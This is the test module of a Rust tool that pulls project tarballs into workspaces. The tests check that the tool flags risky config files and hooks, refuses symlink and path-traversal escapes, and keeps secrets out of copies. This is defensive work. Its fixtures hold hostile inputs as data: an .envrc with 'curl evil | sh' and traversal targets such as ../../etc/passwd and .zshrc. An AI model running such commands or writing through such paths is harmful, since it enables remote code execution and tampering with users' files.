        assert!(refused.contains(&".g\u{200c}it/HEAD"));
        assert!(refused.contains(&"GIT~1/config"));
        assert!(refused.contains(&"readme.MD"));
        let vscode = plan
            .entries
            .iter()
            .find(|e| e.path == ".VSCODE/tasks.json")
            .unwrap();
        assert!(vscode.risky.is_some());
    }

    #[test]
    fn risky_covers_build_tool_configs() {
        for p in [
            ".config/mise/config.toml",
            ".yarnrc.yml",
            ".cargo/config.toml",
            "gradle/wrapper/gradle-wrapper.properties",
            ".mvn/extensions.xml",
            ".claude/settings.json",
            ".Envrc",
        ] {
            assert!(risky(p).is_some(), "{p}");
        }
        assert!(risky("src/main.rs").is_none());
    }

    fn tarball(entries: &[(&str, &[u8], u32)], links: &[(&str, &str)]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (p, data, mode) in entries {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(*mode);
            h.set_entry_type(tar::EntryType::Regular);
            h.set_cksum();
            b.append_data(&mut h, p, *data).unwrap();
        }
        for (p, target) in links {
            let mut h = tar::Header::new_gnu();
            h.set_entry_type(tar::EntryType::Symlink);
            h.set_size(0);
            b.append_link(&mut h, p, target).unwrap();
        }
        b.into_inner().unwrap()
    }

    #[test]
    fn each_file_is_read_by_its_length_and_anything_else_stops_it() {
        let names = ["a", "b", "c", "d"];
        let t = framed(&names, b"3\nx\ny-\n  2\nzz", 9);
        assert_eq!(t.get("a").map(Vec::as_slice), Some(&b"x\ny"[..]));
        assert_eq!(t.get("c").map(Vec::as_slice), Some(&b"zz"[..]));
        assert_eq!(t.len(), 2, "b is absent and d never came");
        assert!(framed(&names, b"9\nshort", 9).is_empty());
        assert!(framed(&names, b"3\nabc", 2).is_empty(), "over the limit");
        assert!(framed(&names, b"x\n", 9).is_empty());
    }

    #[test]
    fn names_from_dirs() {
        assert_eq!(name_from("/Users/x/dev/My_Project"), "my-project");
        assert_eq!(name_from("eetu/luoto.git"), "luoto");
        assert_eq!(name_from("/tmp/x/"), "x");
    }

    #[test]
    fn plan_flags_risky_and_refuses_escapes() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("same.txt"), b"same").unwrap();
        let raw = tarball(
            &[
                ("./src/main.rs", b"fn main() {}", 0o644),
                ("./same.txt", b"same", 0o644),
                ("./.envrc", b"curl evil | sh", 0o644),
                ("./.vscode/tasks.json", b"{}", 0o644),
                ("./run.sh", b"#!/bin/sh", 0o755),
            ],
            &[
                ("./ok-link", "src/main.rs"),
                ("./bad-link", "../../etc/passwd"),
                ("./abs", "/etc/passwd"),
            ],
        );
        let plan = build_plan(&raw, dir.path(), &[]).unwrap();
        assert_eq!(plan.unchanged, 1);
        let get = |p: &str| plan.entries.iter().find(|e| e.path == p);
        assert!(get("src/main.rs").unwrap().risky.is_none());
        assert!(get(".envrc").unwrap().risky.is_some());
        assert!(get(".vscode/tasks.json").unwrap().risky.is_some());
        assert_eq!(
            get("run.sh").unwrap().risky.as_deref(),
            Some("becomes executable")
        );
        assert!(get("ok-link").is_some());
        assert_eq!(plan.refused.len(), 2);

        let (written, skipped) = apply_pull(&plan, false).unwrap();
        assert_eq!((written, skipped), (1, 4));
        assert!(dir.path().join("src/main.rs").exists());
        assert!(!dir.path().join(".envrc").exists());
    }

    #[cfg(unix)]
    #[test]
    fn a_backslash_name_is_refused_not_turned_into_a_path() {
        let root = tempfile::tempdir().unwrap();
        let dir = root.path().join("a/b/project");
        std::fs::create_dir_all(&dir).unwrap();
        let raw = tarball(
            &[
                ("./x\\..\\..\\..\\.zshrc", b"evil", 0o644),
                ("./x\\..\\.git\\config", b"evil", 0o644),
            ],
            &[("./l", "..\\..\\.zshrc")],
        );
        let plan = build_plan(&raw, &dir, &[]).unwrap();
        assert!(plan.entries.is_empty(), "{:?}", plan.entries);
        assert_eq!(plan.refused.len(), 3);
        apply_pull(&plan, true).unwrap();
        assert!(!root.path().join("a/.zshrc").exists());
        assert!(!dir.join(".git").exists());
    }

    #[test]
    fn risky_names_are_folded_as_the_filesystem_folds_them() {
        assert!(
            risky(".v\u{17f}code/tasks.json").is_some(),
            "long s is s on APFS"
        );
        assert!(risky("mi\u{17f}e.toml").is_some());
        assert!(risky("VSCODE~1/tasks.json").is_some(), "an 8.3 short name");
        assert!(risky("src/notes~draft.md").is_none());
    }

    #[cfg(unix)]
    #[test]
    fn refuses_writing_through_host_symlinks() {
        let dir = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), dir.path().join("src")).unwrap();
        let raw = tarball(&[("./src/x.rs", b"x", 0o644)], &[]);
        let plan = build_plan(&raw, dir.path(), &[]).unwrap();
        assert!(apply_pull(&plan, false).is_err());
        assert!(!outside.path().join("x.rs").exists());
    }

    #[test]
    fn risky_holds_for_nested_projects() {
        for p in [
            "api/.git/hooks/post-checkout",
            "api/.envrc",
            "web/.vscode/tasks.json",
            "libs/core/gradlew",
            "api/.claude/settings.json",
        ] {
            assert!(risky_nested(p).is_some(), "{p}");
        }
        assert!(risky_nested("api/src/main.rs").is_none());
        assert!(risky_nested("docs/envrc.md").is_none());
    }

    #[test]
    fn pull_leaves_out_repos_with_their_own_folder() {
        let dir = tempfile::tempdir().unwrap();
        let raw = tar_of(&[
            ("./notes.md", b"n"),
            ("./api/src/main.rs", b"x"),
            ("./API/x", b"x"),
            ("./web/.envrc", b"x"),
        ]);
        let plan = build_plan(&raw, dir.path(), &["api".into()]).unwrap();
        let paths: Vec<&str> = plan.entries.iter().map(|e| e.path.as_str()).collect();
        assert_eq!(paths, ["notes.md", "web/.envrc"]);
        assert!(plan.entries[1].risky.is_some());
    }

    #[test]
    fn pull_targets_send_each_folder_repo_home() {
        let root = tempfile::tempdir().unwrap();
        let api = tempfile::tempdir().unwrap();
        let canon = |p: &Path| p.canonicalize().unwrap();
        let ws = Workspace {
            dir: Some(root.path().display().to_string()),
            repos: BTreeMap::from([
                (
                    "api".to_string(),
                    config::Repo {
                        dir: Some(api.path().display().to_string()),
                        ..Default::default()
                    },
                ),
                (
                    "web".to_string(),
                    config::Repo {
                        url: Some("acme/web".into()),
                        ..Default::default()
                    },
                ),
            ]),
            ..Default::default()
        };
        let present = BTreeSet::from(["api".to_string(), "web".to_string()]);
        let all = pull_targets(&ws, None, None, &present).unwrap();
        assert_eq!(all.len(), 2);
        assert_eq!(all[0].dest, canon(root.path()));
        assert_eq!(all[0].skip, ["api", "web"]);
        assert_eq!(all[1].repo.as_deref(), Some("api"));
        assert_eq!(all[1].dest, canon(api.path()));
        assert_eq!(
            pull_targets(&ws, None, None, &BTreeSet::new())
                .unwrap()
                .len(),
            1
        );
        // With `--to`, each repo lands under it, never in its own folder.
        let to = tempfile::tempdir().unwrap();
        let elsewhere = pull_targets(&ws, Some(to.path().to_path_buf()), None, &present).unwrap();
        assert_eq!(elsewhere[1].dest, to.path().join("api"));
        // A repo whose folder is gone is left out.
        let gone = Workspace {
            repos: BTreeMap::from([(
                "old".to_string(),
                config::Repo {
                    dir: Some("/nonexistent/luoto-test".into()),
                    ..Default::default()
                },
            )]),
            ..ws.clone()
        };
        let present_old = BTreeSet::from(["old".to_string()]);
        assert_eq!(
            pull_targets(&gone, None, None, &present_old).unwrap().len(),
            1
        );
        let web = pull_targets(&ws, None, Some("web"), &present).unwrap();
        assert_eq!(web[0].dest, canon(root.path()).join("web"));
        assert!(pull_targets(&ws, None, Some("nope"), &present).is_err());
    }

    #[test]
    fn a_clone_pulls_only_to_a_folder_you_name_never_home() {
        let ws = Workspace {
            url: Some("acme/web".into()),
            repos: BTreeMap::from([(
                "api".to_string(),
                config::Repo {
                    url: Some("acme/api".into()),
                    ..Default::default()
                },
            )]),
            ..Default::default()
        };
        let present = BTreeSet::from(["api".to_string()]);
        let e = pull_targets(&ws, None, None, &present).unwrap_err();
        assert!(format!("{e:#}").contains("--to"), "{e:#}");
        assert!(pull_targets(&ws, None, Some("api"), &present).is_err());
        let to = tempfile::tempdir().unwrap();
        let all = pull_targets(&ws, Some(to.path().to_path_buf()), None, &present).unwrap();
        assert_eq!(all.len(), 1);
        assert_eq!(all[0].dest, to.path());
        assert_eq!(all[0].skip, ["api"]);

        let home = directories::BaseDirs::new()
            .unwrap()
            .home_dir()
            .canonicalize()
            .unwrap();
        assert!(check_pull_dest(&home).is_err());
        assert!(check_pull_dest(home.parent().unwrap()).is_err());
        assert!(check_pull_dest(home.ancestors().last().unwrap()).is_err());
        assert!(check_pull_dest(&to.path().canonicalize().unwrap()).is_ok());
    }

    #[test]
    fn network_paths_are_told_from_local_ones() {
        for p in [
            r"\\server\share\proj",
            "//server/share/proj",
            r"\\?\UNC\server\share",
            r"\\.\UNC\server\share",
            r"/\server\share",
            "/net/host/export",
            "/NET/host",
            "/net",
        ] {
            assert!(network_path(p), "{p}");
        }
        for p in [
            "/Users/me/proj",
            r"C:\Users\me\proj",
            r"\\?\C:\Users\me\proj",
            "~/proj",
            "/network/x",
            "/home/me/net/x",
            "",
        ] {
            assert!(!network_path(p), "{p}");
        }
    }

    #[test]
    fn no_folder_a_config_names_pulls_into_home() {
        let home = directories::BaseDirs::new()
            .unwrap()
            .home_dir()
            .to_path_buf();
        let other = tempfile::tempdir().unwrap();
        let folder = |d: &Path| config::Repo {
            dir: Some(d.display().to_string()),
            ..Default::default()
        };
        let present = BTreeSet::from(["api".to_string()]);
        let at_home = Workspace {
            dir: Some(home.display().to_string()),
            ..Default::default()
        };
        assert!(pull_targets(&at_home, None, None, &present).is_err());
        let repo_above_home = Workspace {
            dir: Some(other.path().display().to_string()),
            repos: BTreeMap::from([("api".to_string(), folder(home.parent().unwrap()))]),
            ..Default::default()
        };
        let e = pull_targets(&repo_above_home, None, None, &present).unwrap_err();
        assert!(format!("{e:#}").contains("home folder"), "{e:#}");
        assert!(pull_targets(&repo_above_home, None, Some("api"), &present).is_err());
        assert!(pull_targets(&at_home, Some(home.clone()), None, &present).is_err());
    }

    #[test]
    fn with_no_env_here_the_error_names_the_envs_cloned_from_a_remote() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths {
            config: dir.path().join("config"),
            data: dir.path().join("data"),
        };
        let mut cfg = config::EnvConfig::default();
        cfg.workspace.url = Some("acme/web".into());
        EnvFile::create(&paths, "web", &cfg).unwrap();
        let mut own = config::EnvConfig::default();
        own.workspace.dir = Some(dir.path().display().to_string());
        EnvFile::create(&paths, "api", &own).unwrap();
        let msg = no_env_here(&paths, Path::new("/tmp"));
        assert!(msg.ends_with("so -e picks them: web"), "{msg}");
    }

    #[test]
    fn a_repo_folder_finds_its_env() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths {
            config: dir.path().join("config"),
            data: dir.path().join("data"),
        };
        let platform = tempfile::tempdir().unwrap();
        let api = tempfile::tempdir().unwrap();
        let api_s = api.path().display().to_string();
        let mut cfg = config::EnvConfig::default();
        cfg.workspace.dir = Some(platform.path().display().to_string());
        cfg.workspace.repos.insert(
            "api".into(),
            config::Repo {
                dir: Some(api_s.clone()),
                ..Default::default()
            },
        );
        EnvFile::create(&paths, "platform", &cfg).unwrap();
        let sub = api.path().canonicalize().unwrap().join("src");
        assert_eq!(
            env_for_dir(&paths, &sub).unwrap().as_deref(),
            Some("platform")
        );
        // The repo's own env wins over the env it is a repo of.
        let mut own = config::EnvConfig::default();
        own.workspace.dir = Some(api_s);
        EnvFile::create(&paths, "api", &own).unwrap();
        assert_eq!(env_for_dir(&paths, &sub).unwrap().as_deref(), Some("api"));
    }

    #[test]
    fn copies_leave_out_what_git_ignores() {
        let root = tempfile::tempdir().unwrap();
        let r = root.path();
        let git = |dir: &Path| {
            assert!(
                std::process::Command::new("git")
                    .args(["init", "-q"])
                    .arg(dir)
                    .status()
                    .unwrap()
                    .success()
            );
        };
        let write = |rel: &str, text: &str| {
            let p = r.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, text).unwrap();
        };
        git(r);
        write(".gitignore", "secret.env\n.kube/\n");
        write("a.txt", "a");
        write("secret.env", "TOKEN=x");
        write(".kube/config", "x");
        write("node_modules/x.js", "x");
        git(&r.join("sub"));
        write("sub/.gitignore", "*.tfvars\n");
        write("sub/main.tf", "x");
        write("sub/prod.tfvars", "x");
        let list = copy_list(r).unwrap();
        let has = |p: &str| list.iter().any(|(rel, _)| rel == Path::new(p));
        for p in [
            ".gitignore",
            "a.txt",
            ".git",
            ".git/HEAD",
            "sub",
            "sub/main.tf",
            "sub/.git/HEAD",
        ] {
            assert!(has(p), "{p} is copied: {list:?}");
        }
        for p in [
            "secret.env",
            ".kube/config",
            "node_modules/x.js",
            "sub/prod.tfvars",
        ] {
            assert!(!has(p), "{p} stays out");
        }
        // Folders come before what they hold.
        let at = |p: &str| {
            list.iter()
                .position(|(rel, _)| rel == Path::new(p))
                .unwrap()
        };
        assert!(at("sub") < at("sub/main.tf"));
        // A plain folder holding the repo copies everything else, and the repo through git.
        let outer = tempfile::tempdir().unwrap();
        std::fs::write(outer.path().join("notes.md"), "n").unwrap();
        std::fs::rename(r, outer.path().join("repo")).unwrap();
        let list = copy_list(outer.path()).unwrap();
        let has = |p: &str| list.iter().any(|(rel, _)| rel == Path::new(p));
        assert!(has("notes.md") && has("repo/a.txt") && !has("repo/secret.env"));
    }
}
